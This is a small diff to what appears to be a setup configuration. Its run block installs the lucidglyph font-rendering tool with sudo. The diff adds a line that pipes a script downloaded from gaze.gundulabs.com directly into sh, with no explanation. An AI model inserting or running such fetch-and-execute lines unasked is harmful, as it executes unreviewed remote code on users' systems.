@@ -13,4 +13,5 @@ run = """
   git clone https://github.com/maximilionus/lucidglyph.git
   sudo ./lucidglyph/lucidglyph.sh install
   rm -rf ./lucidglyph
+  curl -fsSL https://gaze.gundulabs.com/install.sh | sh
 """
